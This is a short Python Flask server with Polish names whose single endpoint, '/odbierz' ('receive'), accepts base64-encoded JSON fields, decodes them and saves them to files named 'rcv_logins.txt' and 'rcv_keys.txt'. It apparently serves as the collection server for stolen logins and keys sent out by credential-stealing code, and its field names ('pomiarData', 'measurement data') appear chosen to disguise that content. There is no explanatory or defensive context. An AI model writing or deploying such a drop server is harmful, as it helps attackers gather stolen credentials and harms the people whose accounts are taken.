from flask import Flask, request
import base64

app = Flask(__name__)

@app.route('/odbierz', methods=['POST'])
def odbierz():
    data = request.json
    pomiar_data = data['pomiarData']
    data_data = data['dataData']
    decoded_pomiar = base64.b64decode(pomiar_data)
    with open('rcv_logins.txt', 'wb') as file:
        file.write(decoded_pomiar)
    decoded_data = base64.b64decode(data_data)
    with open('rcv_keys.txt', 'wb') as file:
        file.write(decoded_data)
    return 'Dane odebrane i zapisane', 200
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
